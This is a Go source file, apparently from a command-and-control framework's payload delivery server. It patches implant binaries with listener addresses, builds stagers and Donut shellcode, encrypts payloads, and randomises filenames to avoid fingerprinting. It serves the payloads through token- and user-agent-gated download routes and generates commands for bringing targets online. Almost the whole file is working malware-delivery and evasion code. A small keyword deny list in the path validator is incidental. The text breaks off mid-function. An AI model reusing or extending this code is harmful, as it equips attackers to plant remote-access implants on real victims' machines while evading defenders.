package api

import (
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/delivery"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/godonut"
	"context"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"BackendTemplate/pkg/utils/logx"
	"github.com/gin-gonic/gin"
)

// legacy dedicated-port servers (bind_mode=dedicated)
var WebDeliveryServer = make(map[string]*http.Server)
var Mutex sync.Mutex

// validateDownloadPath 验证和清理下载路径
func validateDownloadPath(path string, osType string) (string, error) {
	if path == "" {
		if osType == "windows" {
			return `C:\Windows\Temp`, nil
		}
		return "/tmp", nil
	}
	path = strings.TrimSpace(path)
	sqlPatterns := []string{
		`'`, `"`, `;`, `--`, `/*`, `*/`, `xp_`, `sp_`,
		`union`, `select`, `insert`, `update`, `delete`, `drop`,
		`exec`, `execute`, `script`, `<script`, `javascript:`,
	}
	lowerPath := strings.ToLower(path)
	for _, pattern := range sqlPatterns {
		if strings.Contains(lowerPath, strings.ToLower(pattern)) {
			return "", fmt.Errorf("路径包含不安全字符: %s", pattern)
		}
	}
	if strings.Contains(path, "..") || strings.Contains(path, "~") {
		return "", fmt.Errorf("路径不能包含 '..' 或 '~'")
	}
	if len(path) > 200 {
		return "", fmt.Errorf("路径长度不能超过200个字符")
	}
	return path, nil
}

// inferPayloadFormat 从文件名推断载荷格式（.dll 结尾视为 dll，其余默认 exe）
func inferPayloadFormat(filename string) string {
	if strings.HasSuffix(strings.ToLower(filename), ".dll") {
		return "dll"
	}
	return "exe"
}

// ensureCryptoReady 校验 AEAD 密钥可用；EnsureCryptoDefaults 已负责生成，这里兜底。
func ensureCryptoReady(meta *database.WebDelivery) error {
	if meta.CryptoMode != "aead" {
		return nil
	}
	if _, err := delivery.DecodeAEADKey(meta.DeliveryKey); err != nil {
		return fmt.Errorf("AEAD 密钥不可用: %w", err)
	}
	return nil
}

// validCryptoMode 校验载荷加密模式；空字符串表示沿用/兼容旧配置。
func validCryptoMode(mode string) bool {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "", "none", "xor", "aead":
		return true
	default:
		return false
	}
}

// loadAndPatchClient reads embedded binary and patches placeholders
func loadAndPatchClient(listener, osType, archType, pass, format string) ([]byte, string, error) {
	if listener == "" || !strings.Contains(listener, "://") {
		return nil, "", fmt.Errorf("listener 格式错误，应为 protocol://address")
	}
	tmp := strings.SplitN(listener, "://", 2)
	listenerType := strings.ToLower(tmp[0])
	// https 有独立客户端目录 server/https（含 https_ 前缀二进制）
	binaryDir := listenerType
	var binaryFileName string
	if strings.ToLower(format) == "dll" {
		if strings.ToLower(osType) != "windows" {
			return nil, "", fmt.Errorf("dll 格式仅支持 windows 目标")
		}
		binaryFileName = findBinaryWithExt(binaryDir, osType, archType, []string{".dll"})
	} else {
		binaryFileName = findBinary(binaryDir, osType, archType)
	}
	if binaryFileName == "" {
		return nil, "", fmt.Errorf("未找到匹配的客户端二进制: protocol=%s os=%s arch=%s format=%s", listenerType, osType, archType, format)
	}
	// 读取嵌入模板（gzip 压缩，readTemplate 自动解压，兼容未压缩旧模板）
	binaryData, err := readTemplate(binaryDir, binaryFileName)
	if err != nil {
		return nil, "", fmt.Errorf("读取文件失败: %v", err)
	}
	opts := delivery.PatchOptions{
		ListenerConfig: listener,
		OS:             osType,
		Arch:           archType,
		Pass:           pass,
		Format:         format,
		HashPad:        cfgHashPad(),
		Sign:           true, // WebDelivery 交付的文件同样签名（未启用时为空操作）
	}
	// 把监听器绑定画像的 URI/WS/DNS/UA 等特征一并 patch，否则绑非 default 画像的
	// 监听器生成的载荷会按 default 路径连接，永远不上线。
	applyListenerProfile(&opts, listener)
	patched, err := delivery.PatchClientBinary(binaryData, opts)
	if err != nil {
		return nil, "", err
	}
	return patched, binaryFileName, nil
}

// ListWebDelivery 列表
func ListWebDelivery(c *gin.Context) {
	var webs []database.WebDelivery
	webs, _ = database.Deliveries().List()
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": webs})
}

// startDeliveryRequest 创建投递请求体（兼容旧字段 + Hub 新字段）
type startDeliveryRequest struct {
	ID           int64  `json:"id"` // 仅更新接口使用；创建时忽略
	Listener     string `json:"listener"`
	OS           string `json:"os"`
	Arch         string `json:"arch"`
	Port         string `json:"port"` // dedicated 模式端口；shared 可空
	Filename     string `json:"filename"`
	Pass         string `json:"pass"`
	DownloadPath string `json:"downloadPath"`
	SaveFilename string `json:"saveFilename"`

	// Hub 扩展
	BindMode         string `json:"bindMode"` // shared | dedicated（默认 shared）
	PublicHost       string `json:"publicHost"`
	PublicScheme     string `json:"publicScheme"` // http | https
	BasePath         string `json:"basePath"`     // CDN path prefix
	URIPath          string `json:"uriPath"`
	ContentType      string `json:"contentType"`
	StageContentType string `json:"stageContentType"`
	AccessToken      string `json:"accessToken"`
	UAAllow          string `json:"uaAllow"`
	MaxDownloads     int    `json:"maxDownloads"`
	OneTime          bool   `json:"oneTime"`
	// 载荷加密：none | xor | aead（AEAD 密钥由服务端生成，不接受客户端传入）
	CryptoMode string `json:"cryptoMode"`
	// 仅编辑接口使用：丢弃旧 AEAD 密钥并生成新密钥（旧 Stager 立即失效）
	RegenerateKey bool   `json:"regenerateKey"`
	BuildStager   *bool  `json:"buildStager"` // 默认 true
	Format        string `json:"format"`      // exe(默认) | dll（仅 windows，rundll32/regsvr32 加载）
	Note          string `json:"note"`
}

// StartWebDelivery 创建并启动投递（Delivery Hub）
func StartWebDelivery(c *gin.Context) {
	var req startDeliveryRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	// 前端从监听器列表选的地址是脱敏值，先还原：否则会把占位符落库并 patch 进载荷
	req.Listener = resolveListenerAddress(req.Listener, "connect")
	if req.Listener == "" || req.OS == "" || req.Arch == "" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "listener/os/arch 必填"})
		return
	}
	if !validCryptoMode(req.CryptoMode) {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "cryptoMode 仅支持 none / xor / aead"})
		return
	}

	validatedPath, err := validateDownloadPath(req.DownloadPath, req.OS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	req.DownloadPath = validatedPath

	bindMode := strings.ToLower(strings.TrimSpace(req.BindMode))
	if bindMode == "" {
		// 若显式给了 port 且不是 shared，走 dedicated 兼容；否则默认 shared
		if req.Port != "" && req.Port != "0" && !strings.HasPrefix(req.Port, "shared") {
			bindMode = "dedicated"
		} else {
			bindMode = "shared"
		}
	}
	if bindMode != "shared" && bindMode != "dedicated" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "bindMode 仅支持 shared 或 dedicated"})
		return
	}
	if bindMode == "dedicated" && (req.Port == "" || req.Port == "0") {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "dedicated 模式必须指定 port"})
		return
	}

	// 防止 dedicated 端口冲突
	if bindMode == "dedicated" {
		Mutex.Lock()
		_, exists := WebDeliveryServer[req.Port]
		Mutex.Unlock()
		if exists {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口已被占用: " + req.Port})
			return
		}
		// DB 侧再查一次：内存表只反映本进程起的服务，进程重启后残留的
		// status=1 记录只能靠这条查到
		if has, _ := database.Deliveries().PortInUse(req.Port); has {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口记录已存在: " + req.Port})
			return
		}
	}

	reqFormat := strings.ToLower(strings.TrimSpace(req.Format))
	if reqFormat != "" && reqFormat != "exe" && reqFormat != "dll" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "format 仅支持 exe 或 dll"})
		return
	}

	patched, _, err := loadAndPatchClient(req.Listener, req.OS, req.Arch, req.Pass, reqFormat)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}

	meta := database.WebDelivery{
		ListenerConfig:   req.Listener,
		OS:               req.OS,
		Arch:             req.Arch,
		ListeningPort:    req.Port,
		Status:           1,
		FileName:         req.Filename,
		Pass:             req.Pass,
		DownloadPath:     req.DownloadPath,
		SaveFilename:     req.SaveFilename,
		BindMode:         bindMode,
		PublicHost:       req.PublicHost,
		PublicScheme:     req.PublicScheme,
		BasePath:         req.BasePath,
		URIPath:          strings.Trim(req.URIPath, "/"),
		ContentType:      req.ContentType,
		StageContentType: req.StageContentType,
		AccessToken:      req.AccessToken,
		UAAllow:          req.UAAllow,
		MaxDownloads:     req.MaxDownloads,
		Note:             req.Note,
		CryptoMode:       strings.ToLower(strings.TrimSpace(req.CryptoMode)),
	}
	if req.OneTime {
		meta.OneTime = 1
	}
	// 【XOR 混淆】默认不启用（XorKey=0）：full/stager 载荷保持明文，用户可直接下载运行。
	// 启用方式：数据库/接口显式设置 XorKey 后，载荷经 XOR 加密下发，
	// Stager 模板内置同 key 解密（直接下载 full 运行的用户需自行解密）。
	// 此前自动随机设置 XorKey 导致直接下载的客户端被加密 → 无法运行。
	if strings.TrimSpace(meta.FileName) == "" {
		// 不再默认使用客户端模板名（如 client_windows_amd64.exe）或 svchost.exe，
		// 每个投递生成带随机后缀的名字，降低文件名维度的固定指纹。
		meta.FileName = delivery.RandomFileName(meta.OS, reqFormat, delivery.ShortKey())
	}
	// dedicated 模式会把文件名注册成独立路由，提前校验，避免创建成功但端口启动失败
	if bindMode == "dedicated" {
		if err := validateDeliveryFileName(meta.FileName); err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
			return
		}
	}
	delivery.EnsureMetaDefaults(&meta)
	if err := ensureCryptoReady(&meta); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}

	// 先填 URL（stager 构建需要下载地址）
	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())

	buildStager := true
	if req.BuildStager != nil {
		buildStager = *req.BuildStager
	}

	// 完整载荷
	payload, err := delivery.BuildPayload(meta, patched, false)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}

	// 动态 stager：Windows 拉 shellcode/woff，Linux 拉 full（见 delivery.StagerDownloadURL）
	if buildStager && reqFormat != "dll" {
		dl := delivery.StagerDownloadURL(meta)
		if stagerBin, err := delivery.RebuildStagerForURL(meta, dl); err == nil {
			payload.Stager = stagerBin
			// 若还没有 shellcode，尝试对 stager 做 donut
			if len(payload.Shellcode) == 0 && meta.OS == "windows" {
				if sc, err2 := godonut.GenShellcode(stagerBin, "", meta.Arch); err2 == nil {
					payload.Shellcode = sc
				}
			}
		} else {
			logx.Infof("[WebDelivery] stager 构建跳过: %v\n", err)
		}
	}

	// 再生成一次 shellcode（对 full）若仍空（dll 跳过）
	if len(payload.Shellcode) == 0 && meta.OS == "windows" && reqFormat != "dll" {
		if sc, err := godonut.GenShellcode(patched, meta.Pass, meta.Arch); err == nil {
			payload.Shellcode = sc
		}
	}

	// AEAD 的 full/shellcode 是密文，必须有 Stager 才能解密执行；Windows 还需要 shellcode。
	if meta.CryptoMode == "aead" && (!buildStager || reqFormat == "dll" || len(payload.Stager) == 0 ||
		(strings.EqualFold(meta.OS, "windows") && len(payload.Shellcode) == 0)) {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "AEAD 模式需要成功构建 Stager 与 shellcode（不支持 dll 格式，且服务端需有 Go 工具链/Donut）"})
		return
	}

	// 入库
	if _, err := database.Deliveries().Insert(&meta); err != nil {
		// 无 ID 主键的旧库可能失败；尝试不带 ID
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "写入数据库失败: " + err.Error()})
		return
	}

	// 注册到 Hub
	delivery.GlobalHub.Register(meta, payload)

	// dedicated 模式：额外在独立端口提供兼容路由
	if bindMode == "dedicated" {
		if err := startDedicatedServer(meta, payload); err != nil {
			// 回滚 hub + db
			delivery.GlobalHub.Unregister(meta.PublicKey, meta.ListeningPort)
			_, _ = database.Deliveries().DeleteByPublicKey(meta.PublicKey)
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "独立端口启动失败: " + err.Error()})
			return
		}
	}

	// 命令矩阵
	cmds := delivery.GenerateCommands(delivery.CommandOptions{
		FullURL:      meta.ServerAddress,
		StagerURL:    meta.StagerURL,
		ShellcodeURL: meta.ShellcodeURL,
		OS:           meta.OS,
		Arch:         meta.Arch,
		Pass:         meta.Pass,
		DownloadPath: meta.DownloadPath,
		SaveFilename: meta.SaveFilename,
		AccessToken:  meta.AccessToken,
		CryptoAEAD:   meta.CryptoMode == "aead",
	})

	// D18: 业务审计
	auditLogEvent("WEBDELIVERY_START", "SUCCESS", "启动投递 "+meta.PublicKey+" ("+meta.OS+"/"+meta.Arch+")", map[string]interface{}{"key": meta.PublicKey, "os": meta.OS, "arch": meta.Arch})
	c.JSON(http.StatusOK, gin.H{
		"status": http.StatusOK,
		"data": gin.H{
			"delivery": meta,
			"commands": cmds,
			"urls": gin.H{
				"full":      meta.ServerAddress,
				"stager":    meta.StagerURL,
				"shellcode": meta.ShellcodeURL,
			},
		},
	})
}

// replaceFileExt 把文件名后缀替换成指定扩展名（无后缀则直接追加）。
func replaceFileExt(name, ext string) string {
	if i := strings.LastIndex(name, "."); i > 0 {
		name = name[:i]
	}
	return name + ext
}

// UpdateWebDelivery 编辑一条已关闭的投递。
//
// 只改库，不动正在运行的服务：运行中的投递在 Hub / 独立端口里都已按旧配置注册，
// 改库不会影响当前分发的载荷（还会造成"界面显示 A、实际发 B"）。
// 关闭后重新开启时，OpenWebDelivery 会按新配置重新 patch 客户端并重建 stager。
func UpdateWebDelivery(c *gin.Context) {
	var req startDeliveryRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	if req.ID <= 0 {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "缺少投递 id"})
		return
	}
	req.Listener = resolveListenerAddress(req.Listener, "connect")
	if req.Listener == "" || req.OS == "" || req.Arch == "" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "listener/os/arch 必填"})
		return
	}
	if !validCryptoMode(req.CryptoMode) {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "cryptoMode 仅支持 none / xor / aead"})
		return
	}

	meta, found, _ := database.Deliveries().GetByID(req.ID)
	if !found {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}
	if meta.Status == 1 {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "投递正在运行，请先关闭后再编辑"})
		return
	}

	validatedPath, err := validateDownloadPath(req.DownloadPath, req.OS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	req.DownloadPath = validatedPath

	bindMode := strings.ToLower(strings.TrimSpace(req.BindMode))
	if bindMode == "" {
		bindMode = meta.BindMode
	}
	if bindMode == "" {
		bindMode = "shared"
	}
	if bindMode != "shared" && bindMode != "dedicated" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "bindMode 仅支持 shared 或 dedicated"})
		return
	}
	if bindMode == "dedicated" && (req.Port == "" || req.Port == "0") {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "dedicated 模式必须指定 port"})
		return
	}
	// 端口冲突检查必须排除自己：编辑其他字段时端口通常没变
	if bindMode == "dedicated" && req.Port != meta.ListeningPort {
		Mutex.Lock()
		_, inMem := WebDeliveryServer[req.Port]
		Mutex.Unlock()
		if inMem {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口已被占用: " + req.Port})
			return
		}
		if has, _ := database.Deliveries().PortInUse(req.Port); has {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口记录已存在: " + req.Port})
			return
		}
	}

	reqFormat := strings.ToLower(strings.TrimSpace(req.Format))
	if reqFormat == "" {
		reqFormat = inferPayloadFormat(meta.FileName)
	}
	if reqFormat != "exe" && reqFormat != "dll" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "format 仅支持 exe 或 dll"})
		return
	}
	if reqFormat == "dll" && strings.ToLower(req.OS) != "windows" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "dll 格式仅支持 windows 目标"})
		return
	}

	// 用真实模板做一次校验：OS/Arch/协议/格式任一不存在，原本要等"开启"时才报错，
	// 这里提前拦住，避免"保存成功、一开就失败"。
	_, _, err = loadAndPatchClient(req.Listener, req.OS, req.Arch, req.Pass, reqFormat)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}

	fileName := strings.TrimSpace(req.Filename)
	if fileName == "" {
		fileName = delivery.RandomFileName(req.OS, reqFormat, meta.PublicKey)
	}
	// 关闭后 OpenWebDelivery 按文件名后缀推断格式；编辑 dll/exe 时把后缀对齐，
	// 否则会出现"选了 dll、库里是 exe 后缀"，开启时找不到模板。
	if strings.ToLower(req.OS) == "windows" {
		if reqFormat == "dll" && !strings.HasSuffix(strings.ToLower(fileName), ".dll") {
			fileName = replaceFileExt(fileName, ".dll")
		} else if reqFormat == "exe" && strings.HasSuffix(strings.ToLower(fileName), ".dll") {
			fileName = replaceFileExt(fileName, ".exe")
		}
	}
	if bindMode == "dedicated" {
		if err := validateDeliveryFileName(fileName); err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
			return
		}
	}

	meta.ListenerConfig = req.Listener
	meta.OS = req.OS
	meta.Arch = req.Arch
	meta.BindMode = bindMode
	meta.FileName = fileName
	meta.Pass = req.Pass
	meta.DownloadPath = req.DownloadPath
	meta.SaveFilename = req.SaveFilename
	meta.PublicHost = req.PublicHost
	meta.PublicScheme = req.PublicScheme
	meta.BasePath = req.BasePath
	meta.URIPath = strings.Trim(req.URIPath, "/")
	meta.ContentType = req.ContentType
	meta.StageContentType = req.StageContentType
	meta.AccessToken = req.AccessToken
	meta.UAAllow = req.UAAllow
	meta.MaxDownloads = req.MaxDownloads
	meta.Note = req.Note
	if mode := strings.ToLower(strings.TrimSpace(req.CryptoMode)); mode != "" {
		meta.CryptoMode = mode
	}
	if req.RegenerateKey && meta.CryptoMode == "aead" {
		// 置空后由 EnsureCryptoDefaults 生成新密钥
		meta.DeliveryKey = ""
	}
	if req.OneTime {
		meta.OneTime = 1
	} else {
		meta.OneTime = 0
	}

	delivery.EnsureMetaDefaults(&meta)
	if err := ensureCryptoReady(&meta); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	// PublicKey 可能由 EnsureMetaDefaults 补生成：shared 的端口标记要在它之后算
	if bindMode == "dedicated" {
		meta.ListeningPort = req.Port
	} else {
		meta.ListeningPort = "shared-" + meta.PublicKey
	}
	// 编辑不等于启动：状态保持关闭，由操作员显式点"开启"才注册 Hub
	meta.Status = 2
	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())

	if _, err := database.Deliveries().UpdateEditable(meta.ID, &meta); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 500, "data": "保存失败: " + err.Error()})
		return
	}
	auditLogEvent("WEBDELIVERY_UPDATE", "SUCCESS", "编辑投递 "+meta.PublicKey, map[string]interface{}{"key": meta.PublicKey})
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": meta})
}

func startDedicatedServer(meta database.WebDelivery, payload delivery.Payload) error {
	mux := http.NewServeMux()
	// legacy path /{filename}
	fname := meta.FileName
	// J9: 文件名白名单（原直接注册 → Go 1.24 ServeMux 含 {/} 等模式字符可 panic/意外路由）
	if err := validateDeliveryFileName(fname); err != nil {
		return err
	}
	// 所有 legacy 路由统一改写回 Hub：AccessToken / UA 白名单 / 一次性 / 下载上限 /
	// XorKey / 访问日志只有 Hub 里那一套。此前这些 handler 直接 serveBytes，
	// 知道独立端口和默认文件名就能绕过全部访问控制下载载荷。
	mux.HandleFunc("/"+fname, func(w http.ResponseWriter, r *http.Request) {
		serveViaHub(w, r, meta.PublicKey, delivery.ResFull)
	})
	// hub-compatible paths on same port
	hubHandler := func(w http.ResponseWriter, r *http.Request) {
		delivery.GlobalHub.ServeHTTP(w, r)
	}
	mux.HandleFunc(delivery.RoutePrefix()+"/", hubHandler)
	if delivery.RoutePrefix() != "/d" {
		// 兼容升级前生成的旧 URL
		mux.HandleFunc("/d/", hubHandler)
	}
	// legacy woff
	if meta.OS == "windows" && len(payload.Shellcode) > 0 {
		mux.HandleFunc("/"+fname+".woff", func(w http.ResponseWriter, r *http.Request) {
			serveViaHub(w, r, meta.PublicKey, delivery.ResWoff)
		})
	}
	// also /stager /sc shortcuts
	mux.HandleFunc("/stager", func(w http.ResponseWriter, r *http.Request) {
		serveViaHub(w, r, meta.PublicKey, delivery.ResStager)
	})
	mux.HandleFunc("/sc", func(w http.ResponseWriter, r *http.Request) {
		serveViaHub(w, r, meta.PublicKey, delivery.ResShellcode)
	})

	server := &http.Server{
		Addr:              ":" + meta.ListeningPort,
		Handler:           mux,
		ReadHeaderTimeout: 30 * time.Second, // 防 Slowloris
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      120 * time.Second, // 大文件下载预留足够写超时
		IdleTimeout:       120 * time.Second,
	}
	Mutex.Lock()
	WebDeliveryServer[meta.ListeningPort] = server
	Mutex.Unlock()
	go func() {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logx.Println("[WebDelivery dedicated]", err)
		}
	}()
	return nil
}

// serveViaHub 把 dedicated 端口的 legacy 路径改写为 /d/{key}/{resource} 后交给 Hub，
// 确保独立端口与共享端口使用完全相同的访问控制与统计。
func serveViaHub(w http.ResponseWriter, r *http.Request, key, resource string) {
	if key == "" {
		http.NotFound(w, r)
		return
	}
	r2 := r.Clone(r.Context())
	u := *r.URL
	u.Path = "/d/" + key + "/" + resource
	u.RawPath = ""
	r2.URL = &u
	delivery.GlobalHub.ServeHTTP(w, r2)
}

// CloseWebDelivery 关闭
func CloseWebDelivery(c *gin.Context) {
	var web struct {
		Port      string `json:"port"`
		PublicKey string `json:"publicKey"`
		ID        int64  `json:"id"`
	}
	if err := c.ShouldBindJSON(&web); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
		return
	}

	meta, found, _ := database.Deliveries().FindAny(web.ID, web.PublicKey, web.Port)
	if !found {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}

	// stop dedicated server if any
	if meta.ListeningPort != "" {
		Mutex.Lock()
		if srv, ok := WebDeliveryServer[meta.ListeningPort]; ok {
			_ = srv.Close()
			delete(WebDeliveryServer, meta.ListeningPort)
		}
		Mutex.Unlock()
	}
	delivery.GlobalHub.Unregister(meta.PublicKey, meta.ListeningPort)
	_, _ = database.Deliveries().SetStatusByID(meta.ID, 2)
	// legacy rows without id
	if meta.ID == 0 {
		_, _ = database.Deliveries().SetStatusByPort(meta.ListeningPort, 2)
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

// OpenWebDelivery 重新开启
func OpenWebDelivery(c *gin.Context) {
	var web struct {
		Port      string `json:"port"`
		PublicKey string `json:"publicKey"`
		ID        int64  `json:"id"`
	}
	if err := c.ShouldBindJSON(&web); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
		return
	}

	meta, found, _ := database.Deliveries().FindAny(web.ID, web.PublicKey, web.Port)
	if !found {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}

	patched, _, err := loadAndPatchClient(meta.ListenerConfig, meta.OS, meta.Arch, meta.Pass, inferPayloadFormat(meta.FileName))
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	if meta.BindMode == "" {
		if strings.HasPrefix(meta.ListeningPort, "shared") || meta.PublicKey != "" && (meta.ListeningPort == "" || strings.HasPrefix(meta.ListeningPort, "shared")) {
			meta.BindMode = "shared"
		} else if meta.ListeningPort != "" {
			meta.BindMode = "dedicated"
		} else {
			meta.BindMode = "shared"
		}
	}
	delivery.EnsureMetaDefaults(&meta)
	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())

	payload, err := delivery.BuildPayload(meta, patched, false)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	if stagerBin, err := delivery.RebuildStagerForURL(meta, delivery.StagerDownloadURL(meta)); err == nil {
		payload.Stager = stagerBin
	}
	if len(payload.Shellcode) == 0 && meta.OS == "windows" {
		if sc, err := godonut.GenShellcode(patched, meta.Pass, meta.Arch); err == nil {
			payload.Shellcode = sc
		}
	}
	if meta.CryptoMode == "aead" && (len(payload.Stager) == 0 ||
		(strings.EqualFold(meta.OS, "windows") && len(payload.Shellcode) == 0)) {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "AEAD 模式需要可用的 Stager 与 shellcode，当前构建失败"})
		return
	}

	meta.Status = 1
	if meta.ID > 0 {
		_, _ = database.Deliveries().UpdateColumns(meta.ID, []string{"status", "server_address", "stager_url", "shellcode_url", "public_key", "bind_mode", "crypto_mode", "delivery_key", "xor_key"}, &meta)
	} else {
		_, _ = database.Deliveries().UpdateByPort(meta.ListeningPort, &meta)
	}

	delivery.GlobalHub.Register(meta, payload)
	if meta.BindMode == "dedicated" {
		// ensure port free
		Mutex.Lock()
		if old, ok := WebDeliveryServer[meta.ListeningPort]; ok {
			_ = old.Close()
			delete(WebDeliveryServer, meta.ListeningPort)
		}
		Mutex.Unlock()
		if err := startDedicatedServer(meta, payload); err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
			return
		}
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": meta})
}

// DeleteWebDelivery 删除
func DeleteWebDelivery(c *gin.Context) {
	var web struct {
		Port      string `json:"port"`
		PublicKey string `json:"publicKey"`
		ID        int64  `json:"id"`
	}
	if err := c.ShouldBindJSON(&web); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
		return
	}
	meta, found, _ := database.Deliveries().FindAny(web.ID, web.PublicKey, web.Port)
	if !found {
		// still try delete by port for legacy
		if web.Port != "" {
			Mutex.Lock()
			if srv, ok := WebDeliveryServer[web.Port]; ok {
				_ = srv.Close()
				delete(WebDeliveryServer, web.Port)
			}
			Mutex.Unlock()
			delivery.GlobalHub.Unregister("", web.Port)
			_, _ = database.Deliveries().DeleteByPort(web.Port)
			c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
			return
		}
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}

	if meta.ListeningPort != "" {
		Mutex.Lock()
		if srv, ok := WebDeliveryServer[meta.ListeningPort]; ok {
			_ = srv.Close()
			delete(WebDeliveryServer, meta.ListeningPort)
		}
		Mutex.Unlock()
	}
	auditLogEvent("WEBDELIVERY_DELETE", "SUCCESS", "删除投递 "+meta.PublicKey, nil)
	delivery.GlobalHub.Unregister(meta.PublicKey, meta.ListeningPort)
	if meta.ID > 0 {
		// 级联删除走领域层：投递记录 + 它的访问日志必须一起清，
		// 否则日志表会留下指向已删除投递的孤儿行
		_ = database.Deliveries().DeleteCascade(meta)
	} else {
		_, _ = database.Deliveries().DeleteByPort(meta.ListeningPort)
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

// GetDeliveryCommands 获取某条投递的上线命令矩阵
func GetDeliveryCommands(c *gin.Context) {
	idStr := c.Query("id")
	port := c.Query("port")
	key := c.Query("publicKey")

	// 三段式查找必须拿回记录本身：原实现调用只返回 (bool,error) 的分步查找，
	// 查到的记录留在函数局部变量里，meta 永远是零值 —— OS 为空 → 生成器走
	// Linux 分支，Windows 投递也看不到 Windows 命令，URL 也全是空串。
	id, _ := strconv.ParseInt(idStr, 10, 64)
	meta, found, _ := database.Deliveries().FindAny(id, key, port)
	if !found {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}
	// refresh URLs
	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())
	cmds := delivery.GenerateCommands(delivery.CommandOptions{
		FullURL:      meta.ServerAddress,
		StagerURL:    meta.StagerURL,
		ShellcodeURL: meta.ShellcodeURL,
		OS:           meta.OS,
		Arch:         meta.Arch,
		Pass:         meta.Pass,
		DownloadPath: meta.DownloadPath,
		SaveFilename: meta.SaveFilename,
		AccessToken:  meta.AccessToken,
		CryptoAEAD:   meta.CryptoMode == "aead",
	})
	// 【统一响应格式】urls 并入 data（含 status+data+urls 的响应经包装中间件后
	// 额外顶层字段会丢失；业务数据统一放 data）
	//
	// launch_methods：该载荷形态**真能用**的启动方式目录（§3.10 供应链）。
	// 只回形态匹配的那些 —— 给运维一串点了必然失败的命令比不给更糟。
	// format 没落库，按保存的文件名后缀推断（见 delivery.InferLaunchFormat 的说明）
	launchFormat := string(delivery.InferLaunchFormat(meta.SaveFilename, meta.FileName))
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{
		"commands": cmds,
		"urls": gin.H{
			"full": meta.ServerAddress, "stager": meta.StagerURL, "shellcode": meta.ShellcodeURL,
		},
		"launch_format":      launchFormat,
		"launch_methods":     delivery.LaunchMethodsFor(launchFormat),
		"launch_note":        delivery.LaunchFormatNote(launchFormat),
		"launch_unsupported": delivery.UnsupportedLaunchNotes(),
	}})
}

// GetDeliveryAccessLogs 访问日志
func GetDeliveryAccessLogs(c *gin.Context) {
	idStr := c.Query("id")
	key := c.Query("publicKey")
	limit := 100
	if v := c.Query("limit"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 1000 {
			limit = n
		}
	}
